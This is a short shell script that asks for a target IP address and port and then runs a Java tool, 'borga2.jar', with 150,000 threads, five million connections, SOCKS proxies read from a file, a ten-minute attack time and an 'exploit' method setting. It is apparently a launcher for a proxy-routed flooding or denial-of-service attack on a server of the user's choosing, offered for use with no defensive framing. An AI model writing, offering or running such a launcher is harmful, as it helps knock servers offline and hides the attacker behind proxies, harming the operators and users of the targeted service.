clear

read -p 'ip: ' ip
read -p 'port: ' port

java -jar borga2.jar host=$ip port=$port srvResolve=true Resolve2=false alwaysResolve=false threads=150000 connections=5000000 multi=true removeFailure=true socksV4=true loopAmount=190000 timeout=0 keepAlive=true proxiesType=socks print=true proxiesFile=proxies.txt attackTime=600000 exploit=newmethod14